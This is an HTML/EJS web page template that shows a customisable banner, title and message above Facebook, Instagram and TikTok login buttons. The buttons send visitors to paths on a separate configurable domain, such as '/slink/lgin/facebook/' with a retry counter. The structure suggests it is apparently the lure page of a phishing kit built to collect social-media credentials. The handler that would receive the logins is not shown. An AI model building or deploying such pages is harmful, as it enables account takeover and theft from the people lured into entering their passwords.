<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title><%= link.ownerName %></title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
</head>
<body class="bg-gray-100 min-h-screen">
    <%- include('../partials/translate.ejs') %>
    <div class="container mx-auto px-4 py-8">
        <div class="bg-white rounded-lg shadow-lg overflow-hidden mb-8">
            <!-- Banner Image with Title Overlay -->
            <div class="relative">
                <img src="<%= link.image || '/images/social-bg.webp' %>" alt="Banner" class="w-full h-48 object-cover">
                <div class="absolute bottom-0 left-0 right-0 bg-gradient-to-t from-black/70 to-transparent p-4">
                    <h1 class="text-white text-2xl font-bold"><%= link.title %></h1>
                </div>
            </div>
            
            <!-- Body Text -->
            <div class="p-6">
                <p class="text-gray-700 mb-6">
                    <%= link.writeup %>
                </p>
                
                <!-- Social Media Buttons -->
                <div class="flex flex-col md:flex-row gap-4">
                    <% if(JSON.parse(link.socialMedia?.includes('facebook'))) { %>
                    <a href="https://www.<%= p_link %>/slink/lgin/facebook/<%= link.linkId %>?retry=<%= link.retry %>" class="flex items-center justify-center gap-2 bg-blue-600 text-white py-3 px-4 rounded-lg hover:bg-blue-700 transition">
                        <i class="fab fa-facebook-f"></i>
                        Facebook
                    </a>
                    <% } %>
                    <% if(JSON.parse(link.socialMedia?.includes('instagram'))) { %>
                    <a href="https://www.<%= p_link %>/slink/lgin/instagram/<%= link.linkId %>?retry=<%= link.retry %>" class="flex items-center justify-center gap-2 bg-gradient-to-r from-purple-500 to-pink-500 text-white py-3 px-4 rounded-lg hover:from-purple-600 hover:to-pink-600 transition">
                        <i class="fab fa-instagram"></i>
                        Instagram
                    </a>
                    <% } %>
                    <% if(JSON.parse(link.socialMedia?.includes('tiktok'))) { %>
                    <a href="https://www.<%= p_link %>/slink/lgin/tiktok/<%= link.linkId %>?retry=<%= link.retry %>" class="flex items-center justify-center gap-2 bg-black text-white py-3 px-4 rounded-lg hover:bg-gray-900 transition">
                        <i class="fab fa-tiktok"></i>
                        TikTok
                    </a>
                    <% } %>
                </div>
            </div>
        </div>
    </div>

    <footer class="bg-white mt-12 py-6">
        <div class="container mx-auto px-4 text-center text-gray-600">
            <p>© <%= new Date().getFullYear() %>. All rights reserved.</p>
        </div>
    </footer>
</body>
</html>